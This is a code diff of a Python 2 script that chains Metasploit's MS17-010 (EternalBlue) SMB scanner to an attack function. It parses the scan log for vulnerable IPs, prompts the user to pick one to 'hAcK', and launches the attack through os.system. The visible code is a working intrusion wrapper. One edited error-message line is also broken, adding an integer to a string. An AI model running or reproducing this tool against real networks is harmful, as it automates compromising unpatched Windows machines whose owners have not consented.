@@ -17,51 +17,44 @@ def attack(target):
 	print attack_cmd
 	os.system(attack_cmd)
 
-def parse_scan_log():
+def parse_scan_log(scan_log):
 	global IPs_to_hack
 
-	scannerFile = open ("scanner.log", "r")
+	scannerFile = open (scan_log, "r")
 
 	for line in scannerFile.readlines():
 		if "Host is likely VULNERABLE" in line:
 			get_ip = re.findall("[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}", line)
 			IPs_to_hack.append(get_ip[0])
 
-	print(IPs_to_hack)
-
-	# return IPs_to_hack
-
-
+	print IPs_to_hack
 
 if len(sys.argv) != 2:
-	print "Expected one argument, found" + len(sys.argv)
+	print "Expected one argument, found" + len(sys.argv) - 1
 	sys.exit()
 
-os.system("whoami; pwd")
-
 targets = sys.argv[1]
-print "Target IP Address(es):", targets
 scan_log = "scanner.log"
 spool_log = "spool.log"
-
 scan_cmd = 'msfconsole -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS ' + targets + '; show options; run; exit" | tee ' + scan_log
-
-# local_ip = socket.gethostbyname(socket.gethostname()) #simple way
 local_ip = get_local_ip()
+
+print "Target IP Address(es):", targets
 print "Local IP address:", local_ip
-
+print "Scanning for vulnerable hosts..."
 print scan_cmd
-# print "Skipping scan..."
-os.system(scan_cmd)
-# print open(scan_log, 'r').read()
 
-parse_scan_log()
+os.system(scan_cmd)
+
+parse_scan_log(scan_log)
 
 exploitable = len(IPs_to_hack) > 0
 
 if not exploitable:
 	print "No vulnerable targets"
 	sys.exit()
+
+print "Found targets..."
 
 target = IPs_to_hack[0]
 
@@ -70,7 +63,7 @@ if exploitable > 0:
 		print("Which IP would you like to hAcK?")
 		n = 1
 		for ip in IPs_to_hack:
-			print(str(n) + ") " + str(ip))
+			print str(n) + ") " + str(ip)
 			n += 1
 
 		result = raw_input("Enter a number: ")
@@ -79,11 +72,9 @@ if exploitable > 0:
 			if(num <= len(IPs_to_hack) and num > 0):
 				target = IPs_to_hack[num - 1]
 				break
-			print("Invalid input, try again")
+			print "Invalid input, try again"
 		except ValueError:
-			print("Invalid input, try again")
+			print "Invalid input, try again"
 
-print("Attacking target IP: " + target)
+print "Attacking target IP: " + target
 attack(target)
-
-
